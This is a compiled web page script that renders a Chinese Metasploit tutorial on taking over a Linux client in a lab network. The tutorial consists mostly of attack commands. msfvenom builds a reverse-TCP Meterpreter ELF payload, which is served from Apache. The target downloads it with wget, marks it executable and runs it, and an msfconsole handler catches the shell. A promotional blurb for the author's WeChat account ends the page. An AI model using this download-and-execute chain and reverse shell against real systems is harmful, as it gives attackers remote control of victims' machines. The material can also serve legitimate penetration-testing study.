(window.webpackJsonp=window.webpackJsonp||[]).push([[167],{458:function(a,s,t){"use strict";t.r(s);var e=t(7),r=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"使用metasploit实现对linux客户端的渗透"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit实现对linux客户端的渗透"}},[a._v("#")]),a._v(" 使用Metasploit实现对Linux客户端的渗透")]),a._v(" "),s("p",[a._v("攻击机 Kali 192.168.175.128")]),a._v(" "),s("p",[a._v("靶机 CentOS 6.5 192.168.175.132")]),a._v(" "),s("h2",{attrs:{id:"生成elf文件"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#生成elf文件"}},[a._v("#")]),a._v(" 生成elf文件")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" linux/x86/meterpreter/reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".175.128 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("5555")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" elf "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" /var/www/html/pay.elf\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("这里，我们将生成的pay.elf文件保存到了/var/www/html/目录下。")]),a._v(" "),s("h2",{attrs:{id:"启动apache服务器"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#启动apache服务器"}},[a._v("#")]),a._v(" 启动apache服务器")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("service")]),a._v(" apache2 start\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"在靶机上下载pay-elf"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#在靶机上下载pay-elf"}},[a._v("#")]),a._v(" 在靶机上下载pay.elf")]),a._v(" "),s("p",[a._v("这里，假设我们经过一系列的渗透取得了靶机的权限，在靶机上执行如下命令")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("wget")]),a._v(" http://192.168.175.128/pay.elf\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("chmod")]),a._v(" a+x pay.elf\n./pay.elf\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br")])]),s("h2",{attrs:{id:"在攻击机上执行攻击操作"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#在攻击机上执行攻击操作"}},[a._v("#")]),a._v(" 在攻击机上执行攻击操作")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("msfconsole\nuse exploit/multi/handler\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" payload linux/x86/meterpreter/reverse_tcp\nsetg LHOST "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".175.128\nsetg LPORT "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("5555")]),a._v("\nexploit\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br")])]),s("p",[a._v("这样，我们就可以获取目标服务器的Meterpreter了。")]),a._v(" "),s("h2",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[a._v("#")]),a._v(" 写在最后")]),a._v(" "),s("blockquote",[s("p",[a._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=r.exports}}]);